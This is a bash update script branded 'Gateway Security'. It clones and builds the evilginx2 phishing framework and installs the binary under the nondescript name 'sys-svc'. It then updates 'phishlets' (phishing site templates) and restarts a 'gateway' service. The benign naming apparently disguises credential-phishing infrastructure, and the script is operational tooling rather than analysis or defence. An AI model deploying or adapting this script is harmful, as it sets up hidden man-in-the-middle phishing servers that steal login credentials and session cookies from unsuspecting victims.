#!/bin/bash
# ============================================================================
# Gateway Security - Update Script
# ============================================================================

set -euo pipefail

GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
info() { echo -e "${BLUE}[*]${NC} $1"; }

print_banner() {
    clear
    cat << "EOF"
    ╔══════════════════════════════════════════════════════════════════╗
    ║                 Gateway Security - Update Script                  ║
    ╚══════════════════════════════════════════════════════════════════╝
EOF
}

print_banner
log "Checking for updates..."

# Stop services
info "Stopping services..."
sudo systemctl stop gateway 2>/dev/null || true

# Backup current config
info "Backing up configuration..."
BACKUP_DIR="/opt/gateway/backup_$(date +%Y%m%d_%H%M%S)"
sudo mkdir -p "$BACKUP_DIR"
sudo cp -r /opt/gateway/config "$BACKUP_DIR/" 2>/dev/null || true
sudo cp -r /opt/gateway/phishlets "$BACKUP_DIR/" 2>/dev/null || true

# Rebuild binary
info "Rebuilding binary..."
cd /tmp
rm -rf .build_cache
git clone https://github.com/kgretzky/evilginx2.git .build_cache 2>/dev/null
cd .build_cache
/usr/local/go/bin/go mod tidy
/usr/local/go/bin/go build -buildvcs=false -o sys-svc
sudo cp sys-svc /usr/local/bin/sys-svc
sudo chmod +x /usr/local/bin/sys-svc

# Update phishlets from local if available
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -d "$SCRIPT_DIR/phishlets" ]]; then
    info "Updating phishlets..."
    sudo cp "$SCRIPT_DIR/phishlets/"*.yaml /opt/gateway/phishlets/ 2>/dev/null || true
fi

# Restart services
info "Restarting services..."
sudo systemctl start gateway

log "Update complete!"
echo ""
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}                    UPDATE COMPLETE!                            ${NC}"
echo -e "${GREEN}════════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Run 'gateway-cli' to manage your gateway"
echo "Backup saved to: $BACKUP_DIR"